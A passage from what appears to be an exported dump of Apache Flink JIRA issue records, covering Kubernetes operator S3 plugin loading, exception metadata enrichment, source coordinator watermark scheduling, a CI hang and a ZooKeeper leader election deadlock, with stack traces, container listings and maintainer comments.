    at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.runCluster(ClusterEntrypoint.java:282) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.lambda$startCluster$1(ClusterEntrypoint.java:232) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.security.contexts.NoOpSecurityContext.runSecured(NoOpSecurityContext.java:28) ~[flink-dist-1.16.2.jar:1.16.2]
    at org.apache.flink.runtime.entrypoint.ClusterEntrypoint.startCluster(ClusterEntrypoint.java:229) ~[flink-dist-1.16.2.jar:1.16.2]{code}
Looking into the job container, can see that s3 plugins are in folder _/opt/flink/opt_ instead of {_}/opt/flink/plugins/s3{_}, as mentioned [here|https://nightlies.apache.org/flink/flink-docs-stable/docs/deployment/filesystems/plugins/]
{code:java}
root@flink-basic-example-xpto1-86bb9b9d44-hksq8:/opt/flink# cd plugins/
root@flink-basic-example-xpto1-86bb9b9d44-hksq8:/opt/flink/plugins# ls -la
total 4
drwxr-xr-x 10 flink flink 210 May 18 06:07 .
drwxr-xr-x  1 flink flink  37 Jun 11 20:17 ..
drwxr-xr-x  2 flink flink 114 May 18 06:07 external-resource-gpu
drwxr-xr-x  2 flink flink  46 May 18 06:07 metrics-datadog
drwxr-xr-x  2 flink flink  47 May 18 06:07 metrics-graphite
drwxr-xr-x  2 flink flink  47 May 18 06:07 metrics-influx
drwxr-xr-x  2 flink flink  42 May 18 06:07 metrics-jmx
drwxr-xr-x  2 flink flink  49 May 18 06:07 metrics-prometheus
drwxr-xr-x  2 flink flink  44 May 18 06:07 metrics-slf4j
drwxr-xr-x  2 flink flink  45 May 18 06:07 metrics-statsd
-rwxr-xr-x  1 flink flink 654 May 17 09:19 README.txt
root@flink-basic-example-xpto1-86bb9b9d44-hksq8:/opt/flink/plugins# cd ..
root@flink-basic-example-xpto1-86bb9b9d44-hksq8:/opt/flink# cd opt/
root@flink-basic-example-xpto1-86bb9b9d44-hksq8:/opt/flink/opt# ls -la | grep s3
-rw-r--r-- 1 flink flink 30515842 May 18 06:00 flink-s3-fs-hadoop-1.16.2.jar
-rw-r--r-- 1 flink flink 96171268 May 18 06:00 flink-s3-fs-presto-1.16.2.jar {code}
Also, looking into container flink-operator, did not find those s3 plugins

Best regards,
Luís Costa

 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jun 16 21:25:30 UTC 2023,,,,,,,,,,"0|z1ihq0:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 00:35;nateab;Hi [~luismacosta], I believe you need to update your dockerfile to include something like this 
{code:java}
COPY --from=build /app/flink-kubernetes-plugins/target/dependency/flink-s3-fs-presto* /opt/flink/plugins/s3/ {code}
 ;;;","15/Jun/23 08:00;luismacosta;Hi [~nateab] 

Yes, already did that. The error remains.
s3 plugins are now in flink-operator pods
{code:java}
flink@flink-operator-8778bd969-2kxj5:/flink-kubernetes-operator$ ls -lrth /opt/flink/plugins/s3/
total 121M 
-rw-r--r-- 1 flink flink 92M Jun 14 17:19 flink-s3-fs-presto-1.16.2.jar 
-rw-r--r-- 1 flink flink 30M Jun 14 17:19 flink-s3-fs-hadoop-1.16.2.jar{code}
But still missing in flink jobs pods
{code:java}
root@flink-basic-example-xpto2-taskmanager-1-1302:/opt/flink# ls -la plugins
total 4
0 drwxrwxr-x 2 flink flink 114 Jan 19 14:29 external-resource-gpu
0 drwxrwxr-x 2 flink flink  46 Jan 19 14:29 metrics-datadog
0 drwxrwxr-x 2 flink flink  47 Jan 19 14:29 metrics-graphite
0 drwxrwxr-x 2 flink flink  47 Jan 19 14:29 metrics-influx
0 drwxrwxr-x 2 flink flink  42 Jan 19 14:29 metrics-jmx
0 drwxrwxr-x 2 flink flink  49 Jan 19 14:29 metrics-prometheus
0 drwxrwxr-x 2 flink flink  44 Jan 19 14:29 metrics-slf4j
0 drwxrwxr-x 2 flink flink  45 Jan 19 14:29 metrics-statsd
4 -rwxr-xr-x 1 flink flink 654 Jan 19 12:55 README.txt {code};;;","16/Jun/23 14:40;luismacosta;Hello,

I've found the solution
There is no need to create a new docker image using as base image apache/flink-kubernetes-operator:1.5.0
Just need to add the variable  ENABLE_BUILT_IN_PLUGINS in FlinkDeployment


{code:java}
apiVersion: flink.apache.org/v1beta1
kind: FlinkDeployment
metadata:
  name: flink-basic-example-xpto
spec:
  podTemplate:
    apiVersion: v1
    kind: Pod
    metadata:
      name: pod-template
    spec:
      containers:
        - name: flink-main-container
          env:
            - name: ENABLE_BUILT_IN_PLUGINS
              value: flink-s3-fs-hadoop-1.16.2.jar;flink-s3-fs-presto-1.16.2.jar
{code}


And the jar will be loaded in /opt/flink/plugins


{code:java}
root@flink-basic-example-xpto-799d4c969b-rzp46:/opt/flink# ls -la plugins/ | grep s3
drwxr-xr-x 2 root  root   43 Jun 16 14:34 flink-s3-fs-hadoop-1.16.2
drwxr-xr-x 2 root  root   43 Jun 16 14:34 flink-s3-fs-presto-1.16.2
{code}
;;;","16/Jun/23 21:25;nateab;Glad to hear you figured it out! Thanks for including your solution as well.;;;",,,,,,,,,,,,,,,,,,,
Enrich metadata in CR error field,FLINK-32317,13539693,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,,darenwkt,darenwkt,12/Jun/23 16:01,14/Jul/23 11:42,04/Jun/24 20:41,14/Jul/23 11:42,kubernetes-operator-1.5.0,,,,,,,,,,,,,,kubernetes-operator-1.6.0,,,,,,Kubernetes Operator,,,,0,pull-request-available,,,"CR Error field is improved in https://issues.apache.org/jira/browse/FLINK-29708.

The error field is more structured with exception type, stackTrace, additionalMetadata, etc.

 

This ticket is a proposal to expose a config (""kubernetes.operator.exception.metadata.mapper"") to enrich the additionalMetadata further.

 

The config consists of key-value pairs, for example:
{code:java}
kubernetes.operator.exception.metadata.mapper: IOException:Found IOException,403:Found 403 error code{code}
The key is a REGEX string that will be used to match against the whole stack trace and if found, the value will be added to additionalMetadata. For example:
{code:java}
apiVersion: flink.apache.org/v1beta1
kind: FlinkSessionJob
....
  name: basic-session-job-example
  namespace: default
  resourceVersion: ""70206149""
  uid: 916ea8f5-0821-4839-9953-2db9678c3fc9
spec:
  deploymentName: basic-session-deployment-example
  job:
    args: []
    jarURI: https://test-s3.s3.amazonaws.com/doubleExecute.jar
    parallelism: 4
    state: running
    upgradeMode: stateless
status:
  error: '{""type"":""org.apache.flink.kubernetes.operator.exception.ReconciliationException"",""message"":""java.io.IOException:
    Server returned HTTP response code: 403 for URL: https://test-s3.s3.amazonaws.com/doubleExecute.jar"",""additionalMetadata"":{""exceptionMapper"":[""Found
    403 error code"",""Found IOException""]},""throwableList"":[{""type"":""java.io.IOException"",""message"":""Server
    returned HTTP response code: 403 for URL: https://test-s3.s3.amazonaws.com/doubleExecute.jar"",""additionalMetadata"":{""exceptionMapper"":[""Found
    403 error code""]}}]}'
...
{code}
 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Fri Jul 14 11:42:36 UTC 2023,,,,,,,,,,"0|z1ihnk:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"14/Jul/23 11:42;gyfora;merged to main 371a2e6bbb8008c8ffccfff8fc338fb39bda19e2;;;",,,,,,,,,,,,,,,,,,,,,,
Duplicated announceCombinedWatermark task maybe scheduled if jobmanager failover,FLINK-32316,13539667,13542635,Sub-task,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,cailiuyang,cailiuyang,cailiuyang,12/Jun/23 13:01,06/Jul/23 06:56,04/Jun/24 20:41,27/Jun/23 14:24,1.16.0,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,,,,,0,pull-request-available,,,"When we try SourceAlignment feature, we found there will be a duplicated announceCombinedWatermark task will be scheduled after JobManager failover and auto recover job from checkpoint.

The reason i think is  we should schedule announceCombinedWatermark task during SourceCoordinator::start function not in SourceCoordinator construct function (see  [https://github.com/apache/flink/blob/master/flink-runtime/src/main/java/org/apache/flink/runtime/source/coordinator/SourceCoordinator.java#L149] ), because when jobManager encounter failover and auto recover job, it will create SourceCoordinator twice:
 * The first one is  when JobMaster is created it will create the DefaultExecutionGraph, this will init the first sourceCoordinator but will not start it.
 * The Second one is JobMaster call restoreLatestCheckpointedStateInternal method, which will be reset old sourceCoordinator and initialize a new one, but because the first sourceCoordinator is not started(SourceCoordinator will be started before SchedulerBase::startScheduling), so the first SourceCoordinator will not be fully closed.

 

And we also found another problem see jira: https://issues.apache.org/jira/browse/FLINK-32362",,,,,,,,,,,,,,,,,,,,,,,FLINK-32478,,,,,FLINK-32411,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jun 27 14:24:47 UTC 2023,,,,,,,,,,"0|z1ihhs:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 13:14;cailiuyang;[~pnowojski]  please take a look? thks~;;;","15/Jun/23 10:50;fanrui;Hi [~cailiuyang] , thanks for the report.

As I understand, you reported 2 bugs. Could you create a new Jira for ""subtask 25 is not ready yet to receive events""?

And would you like to fix these bugs?;;;","16/Jun/23 01:53;cailiuyang;[~fanrui] OK，please assign to me，thks～;;;","27/Jun/23 14:24;pnowojski;merged to master as b2117bed393
merged to release 1.17 as 758fc14fc59
merged to release 1.16 as 780f675430f

Thanks!;;;",,,,,,,,,,,,,,,,,,,
Support local file upload in K8s mode,FLINK-32315,13539663,,New Feature,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,ferenc-csaky,Paul Lin,Paul Lin,12/Jun/23 12:52,20/Apr/24 18:19,04/Jun/24 20:41,20/Apr/24 18:19,,,,,,,,,,,,,,,1.20.0,,,,,,Client / Job Submission,Deployment / Kubernetes,,,0,pull-request-available,,,"Currently, Flink assumes all resources are locally accessible in the pods, which requires users to prepare the resources by mounting storages, downloading resources with init containers, or rebuilding images for each execution.

We could make things much easier by introducing a built-in file distribution mechanism based on Flink-supported filesystems. It's implemented in two steps:

 
1. KubernetesClusterDescripter uploads all local resources to remote storage via Flink filesystem (skips if the resources are already remote).
2. KubernetesApplicationClusterEntrypoint and KubernetesTaskExecutorRunner download the resources and put them in the classpath during startup.
 
The 2nd step is mostly done by [FLINK-28915|https://issues.apache.org/jira/browse/FLINK-28915], thus this issue is focused on the upload part.
 

 ",,,,,,,,,,,,FLINK-26541,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Apr 20 18:19:11 UTC 2024,,,,,,,,,,"0|z1ihgw:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"24/Jan/24 11:37;ferenc-csaky;Hi! I wrapped up the work on FLINK-28915 and also added support for any kind of dependency, not just the job JAR, so step 2. is completely covered in that work. I would like take this one as well and make the additional dep management story on K8s complete.;;;","25/Jan/24 07:42;mbalassi;[~Paul Lin] I would assign this to [~ferenc-csaky] then unless you have any concerns.;;;","25/Jan/24 08:02;Paul Lin;[~mbalassi] Please go ahead. Thanks!;;;","20/Apr/24 18:19;mbalassi;[{{b3fdb07}}|https://github.com/apache/flink/commit/b3fdb07c04114c515cfc5893e89528bbfb4384ed] in master;;;",,,,,,,,,,,,,,,,,,,
Ignore class-loading errors after RPC system shutdown,FLINK-32314,13539660,,Improvement,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Major,Fixed,chesnay,chesnay,chesnay,12/Jun/23 12:20,04/Jul/23 16:45,04/Jun/24 20:41,13/Jun/23 21:32,,,,,,,,,,,,,,,1.16.3,1.17.2,1.18.0,,,,Runtime / RPC,Tests,,,0,pull-request-available,,,"In tests we occasionally see the akka rpc service throwing class loading errors _after_ it was shut down.
AFAICT our shutdown procedure is correct, and it's just akka shutting down some things asynchronously.
I couldn't figure out why/what is still running, so as a bandaid I suggest to ignore classloading errors after the rpc service shutdown has completed.",,,,,,,,,,,,,,,,FLINK-32189,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Tue Jul 04 16:44:21 UTC 2023,,,,,,,,,,"0|z1ihg8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"13/Jun/23 21:32;chesnay;master: 09df45a88a3c95fd8211a5051572b470d31063b1;;;","04/Jul/23 16:44;Sergey Nuyanzin;1.16: e5049a09900bacc247ee800f3a2fb1b2b77ab609
1.17: f074b65159364c99901507fb1d808cb21dd7172b;;;",,,,,,,,,,,,,,,,,,,,,
CrateDB relies on flink-shaded in flink-connector-jdbc,FLINK-32313,13539653,,Bug,Closed,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Blocker,Fixed,snuyanzin,martijnvisser,martijnvisser,12/Jun/23 11:47,12/Jun/23 18:50,04/Jun/24 20:41,12/Jun/23 18:50,,,,,,,,,,,,,,,jdbc-3.2.0,,,,,,Connectors / JDBC,,,,0,pull-request-available,,,See https://github.com/apache/flink-connector-jdbc/blob/main/flink-connector-jdbc/src/main/java/org/apache/flink/connector/jdbc/databases/cratedb/catalog/CrateDBCatalog.java#L27 - JDBC shouldn't rely on flink-shaded. ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Mon Jun 12 18:50:52 UTC 2023,,,,,,,,,,"0|z1iheo:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 11:47;martijnvisser;[~matriv] This is a blocker for JDBC, can you make sure that no Flink-Shaded is used by CrateDB? ;;;","12/Jun/23 18:50;martijnvisser;Fixed in main: 28016fdec16621e37b0e42322b1a542ca79343f8;;;",,,,,,,,,,,,,,,,,,,,,
SSLConnectionSocketFactory produced no output for 900 seconds,FLINK-32312,13539652,,Bug,Open,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Minor,,,Sergey Nuyanzin,Sergey Nuyanzin,12/Jun/23 11:42,19/Aug/23 22:35,04/Jun/24 20:41,,1.18.0,,,,,,,,,,,,,,,,,,,,Build System / CI,,,,0,auto-deprioritized-major,test-stability,,"https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49688&view=logs&j=fc5181b0-e452-5c8f-68de-1097947f6483&t=995c650b-6573-581c-9ce6-7ad4cc038461&l=15175
{noformat}
""main"" #1 prio=5 os_prio=0 tid=0x00007fb46c00b800 nid=0x184 runnable [0x00007fb473251000]
Jun 06 09:53:49    java.lang.Thread.State: RUNNABLE
Jun 06 09:53:49 	at java.net.PlainSocketImpl.socketConnect(Native Method)
Jun 06 09:53:49 	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)
Jun 06 09:53:49 	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)
Jun 06 09:53:49 	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)
Jun 06 09:53:49 	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)
Jun 06 09:53:49 	at java.net.Socket.connect(Socket.java:607)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.conn.ssl.SSLConnectionSocketFactory.connectSocket(SSLConnectionSocketFactory.java:368)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.conn.DefaultHttpClientConnectionOperator.connect(DefaultHttpClientConnectionOperator.java:142)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.conn.PoolingHttpClientConnectionManager.connect(PoolingHttpClientConnectionManager.java:376)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.execchain.MainClientExec.establishRoute(MainClientExec.java:393)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.execchain.MainClientExec.execute(MainClientExec.java:236)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.execchain.ProtocolExec.execute(ProtocolExec.java:186)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.execchain.RetryExec.execute(RetryExec.java:89)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.execchain.RedirectExec.execute(RedirectExec.java:110)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.client.InternalHttpClient.doExecute(InternalHttpClient.java:185)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.httpclient.impl.client.CloseableHttpClient.execute(CloseableHttpClient.java:83)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.wagon.shared.AbstractHttpClientWagon.execute(AbstractHttpClientWagon.java:1005)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.wagon.shared.AbstractHttpClientWagon.fillInputData(AbstractHttpClientWagon.java:1162)
Jun 06 09:53:49 	at org.apache.maven.wagon.providers.http.wagon.shared.AbstractHttpClientWagon.fillInputData(AbstractHttpClientWagon.java:1140)
Jun 06 09:53:49 	at org.apache.maven.wagon.StreamWagon.getInputStream(StreamWagon.java:126)
Jun 06 09:53:49 	at org.apache.maven.wagon.StreamWagon.getIfNewer(StreamWagon.java:88)

...
{noformat}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Sat Aug 19 22:35:00 UTC 2023,,,,,,,,,,"0|z1iheg:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 11:43;Sergey Nuyanzin;https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49645&view=logs&j=fc5181b0-e452-5c8f-68de-1097947f6483&t=995c650b-6573-581c-9ce6-7ad4cc038461&l=15678;;;","11/Aug/23 22:35;flink-jira-bot;I am the [Flink Jira Bot|https://github.com/apache/flink-jira-bot/] and I help the community manage its development. I see this issues has been marked as Major but is unassigned and neither itself nor its Sub-Tasks have been updated for 60 days. I have gone ahead and added a ""stale-major"" to the issue"". If this ticket is a Major, please either assign yourself or give an update. Afterwards, please remove the label or in 7 days the issue will be deprioritized.
;;;","19/Aug/23 22:35;flink-jira-bot;This issue was labeled ""stale-major"" 7 days ago and has not received any updates so it is being deprioritized. If this ticket is actually Major, please raise the priority and ask a committer to assign you the issue or revive the public discussion.
;;;",,,,,,,,,,,,,,,,,,,,
ZooKeeperLeaderElectionTest.testZooKeeperReelectionWithReplacement and DefaultLeaderElectionService.onGrantLeadership fell into dead lock,FLINK-32311,13539651,,Bug,Resolved,FLINK,Flink,software,sewen,"<h3><a name=""Flink""></a>Welcome to the Apache Flink project</h3>
<p>Apache Flink is an open source platform for scalable batch and stream data processing.</p>",https://flink.apache.org,Critical,Fixed,mapohl,Sergey Nuyanzin,Sergey Nuyanzin,12/Jun/23 11:17,15/Jun/23 12:00,04/Jun/24 20:41,15/Jun/23 12:00,1.18.0,,,,,,,,,,,,,,1.18.0,,,,,,Runtime / Coordination,,,,0,pull-request-available,test-stability,,"[https://dev.azure.com/apache-flink/apache-flink/_build/results?buildId=49750&view=logs&j=0da23115-68bb-5dcd-192c-bd4c8adebde1&t=24c3384f-1bcb-57b3-224f-51bf973bbee8]

 

there are 2 threads one locked {{0x00000000e3a8a1e8}} and waiting for {{0x00000000e3a89c18}}

{noformat}

2023-06-08T01:18:54.5609123Z Jun 08 01:18:54 ""ForkJoinPool-50-worker-25-EventThread"" #956 daemon prio=5 os_prio=0 tid=0x00007f9374253800 nid=0x6a4e waiting for monitor entry [0x00007f94b63e1000]
2023-06-08T01:18:54.5609820Z Jun 08 01:18:54    java.lang.Thread.State: BLOCKED (on object monitor)
2023-06-08T01:18:54.5610557Z Jun 08 01:18:54 	at org.apache.flink.runtime.leaderelection.DefaultLeaderElectionService.runInLeaderEventThread(DefaultLeaderElectionService.java:425)
2023-06-08T01:18:54.5611459Z Jun 08 01:18:54 	- waiting to lock <0x00000000e3a89c18> (a java.lang.Object)
2023-06-08T01:18:54.5612198Z Jun 08 01:18:54 	at org.apache.flink.runtime.leaderelection.DefaultLeaderElectionService.onGrantLeadership(DefaultLeaderElectionService.java:300)
2023-06-08T01:18:54.5613110Z Jun 08 01:18:54 	at org.apache.flink.runtime.leaderelection.ZooKeeperLeaderElectionDriver.isLeader(ZooKeeperLeaderElectionDriver.java:153)
2023-06-08T01:18:54.5614070Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch$$Lambda$1649/586959400.accept(Unknown Source)
2023-06-08T01:18:54.5615014Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.listen.MappingListenerManager.lambda$forEach$0(MappingListenerManager.java:92)
2023-06-08T01:18:54.5616259Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.listen.MappingListenerManager$$Lambda$1640/1393625763.run(Unknown Source)
2023-06-08T01:18:54.5617137Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.listen.MappingListenerManager$$Lambda$1633/2012730699.execute(Unknown Source)
2023-06-08T01:18:54.5618047Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.listen.MappingListenerManager.forEach(MappingListenerManager.java:89)
2023-06-08T01:18:54.5618994Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.listen.StandardListenerManager.forEach(StandardListenerManager.java:89)
2023-06-08T01:18:54.5620071Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch.setLeadership(LeaderLatch.java:711)
2023-06-08T01:18:54.5621198Z Jun 08 01:18:54 	- locked <0x00000000e3a8a1e8> (a org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch)
2023-06-08T01:18:54.5622072Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch.checkLeadership(LeaderLatch.java:597)
2023-06-08T01:18:54.5622991Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch.access$600(LeaderLatch.java:64)
2023-06-08T01:18:54.5623988Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch$7.processResult(LeaderLatch.java:648)
2023-06-08T01:18:54.5624965Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.CuratorFrameworkImpl.sendToBackgroundCallback(CuratorFrameworkImpl.java:926)
2023-06-08T01:18:54.5626218Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.CuratorFrameworkImpl.processBackgroundOperation(CuratorFrameworkImpl.java:683)
2023-06-08T01:18:54.5627369Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.WatcherRemovalFacade.processBackgroundOperation(WatcherRemovalFacade.java:152)
2023-06-08T01:18:54.5628353Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.imps.GetChildrenBuilderImpl$2.processResult(GetChildrenBuilderImpl.java:187)
2023-06-08T01:18:54.5629281Z Jun 08 01:18:54 	at org.apache.flink.shaded.zookeeper3.org.apache.zookeeper.ClientCnxn$EventThread.processEvent(ClientCnxn.java:666)
2023-06-08T01:18:54.5630124Z Jun 08 01:18:54 	at org.apache.flink.shaded.zookeeper3.org.apache.zookeeper.ClientCnxn$EventThread.run(ClientCnxn.java:553)
{noformat}
and another locked {{0x00000000e3a89c18}} and waits for {{0x00000000e3a8a1e8}}
{noformat}
2023-06-08T01:18:54.5738286Z Jun 08 01:18:54 ""ForkJoinPool-50-worker-25"" #620 daemon prio=5 os_prio=0 tid=0x00007f953874f000 nid=0x682e waiting for monitor entry [0x00007f95461d4000]
2023-06-08T01:18:54.5738959Z Jun 08 01:18:54    java.lang.Thread.State: BLOCKED (on object monitor)
2023-06-08T01:18:54.5739645Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch.close(LeaderLatch.java:203)
2023-06-08T01:18:54.5740731Z Jun 08 01:18:54 	- waiting to lock <0x00000000e3a8a1e8> (a org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch)
2023-06-08T01:18:54.5741591Z Jun 08 01:18:54 	at org.apache.flink.shaded.curator5.org.apache.curator.framework.recipes.leader.LeaderLatch.close(LeaderLatch.java:190)
2023-06-08T01:18:54.5742609Z Jun 08 01:18:54 	at org.apache.flink.runtime.leaderelection.ZooKeeperLeaderElectionDriver.close(ZooKeeperLeaderElectionDriver.java:135)
2023-06-08T01:18:54.5743491Z Jun 08 01:18:54 	at org.apache.flink.runtime.leaderelection.DefaultLeaderElectionService.close(DefaultLeaderElectionService.java:217)
2023-06-08T01:18:54.5744427Z Jun 08 01:18:54 	- locked <0x00000000e3a89c18> (a java.lang.Object)
2023-06-08T01:18:54.5745200Z Jun 08 01:18:54 	at org.apache.flink.runtime.leaderelection.ZooKeeperLeaderElectionTest.testZooKeeperReelectionWithReplacement(ZooKeeperLeaderElectionTest.java:346)
2023-06-08T01:18:54.5746206Z Jun 08 01:18:54 	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
2023-06-08T01:18:54.5746829Z Jun 08 01:18:54 	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
2023-06-08T01:18:54.5747552Z Jun 08 01:18:54 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
2023-06-08T01:18:54.5748207Z Jun 08 01:18:54 	at java.lang.reflect.Method.invoke(Method.java:498)
...
{noformat}",,,,,,,,,,,,,,,,,,,,,FLINK-31773,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,,,,,9223372036854775807,,,,Thu Jun 15 12:00:48 UTC 2023,,,,,,,,,,"0|z1ihe8:",9223372036854775807,,,,,,,,,,,,,,,,,,,,"12/Jun/23 13:44;mapohl;This can, indeed, happen in the new implementation (even with the {{MultipleComponentLeaderElectionDriver}} implementation which is not used in the test run right now) because we call close on the driver within the lock. The old {{DefaultLeaderElectionService}} implementation didn't do that (see [DefaultLeaderElectionService:113|https://github.com/apache/flink/blob/release-1.17/flink-runtime/src/main/java/org/apache/flink/runtime/leaderelection/DefaultLeaderElectionService.java#L113] in {{release-1.17}}).

The {{DefaultMultipleComponentLeaderElectionService}} implementation does close the driver in a lock, though. But it doesn't rely on the lock when processing the event (e.g. in [DefaultMultipleComponentLeaderElectionService:152|https://github.com/apache/flink/blob/e3cd3b311c1c8a6a0e0cdc849d7c951ef8beea5c/flink-runtime/src/main/java/org/apache/flink/runtime/leaderelection/DefaultMultipleComponentLeaderElectionService.java#L152]). I considered this a bug in the implementation {{MultipleComponent*}} implementation initially: The event handling processing is done in a single thread to avoid locking. But the close method can be still called from another thread. ;;;","13/Jun/23 09:41;mapohl;Ok, I did go through the code comparing the {{DefaultLeaderElectionService}} with the {{DefaultMultipleComponentLeaderElectionService}} in that regards: The actual deadlock in the test happens between the ZK LeaderLatch lock in the curator's event thread and the test code's thread calling the {{DefaultLeaderElectionService#close()}} which is guarded by the {{DefaultLeaderElectionService}}'s lock. With FLINK-31733, we split up the driver lifecycle and the contender lifecycle and moved the driver's closing into the lock's monitor region (because we wanted the driver to be shutdown along the {{leaderOperationExecutor}} which processes the leader events to avoid {{RejectedExecutionException}}s from happening). This caused the concurrent nested lock scenario for the legacy driver to happen (as we see it being documented in the Jira issue).

Now the question is whether or why it didn't appear in the production code where we use the FLINK-24038 classes, i.e. {{MultipleComponentLeaderElectionDriverAdapter}} and {{DefaultMultipleComponentLeaderElectionService}}. The latter one does also close its driver implementation within the locks (analogously to how it's done in the current {{DefaultLeaderElectionService}} implementation). The difference is that the {{DefaultMultipleComponentLeaderElectionService}} owns its own lock. This prevents both threads from trying to own the same two locks.

Therefore, my conclusion is that it's a test code issue right now. But we have to address if we want to continue with FLINK-26522.;;;","15/Jun/23 12:00;mapohl;master: fdfff096a3a513979fe7676ab2e3ab1100468494;;;",,,,,,,,,,,,,,,,,,,,
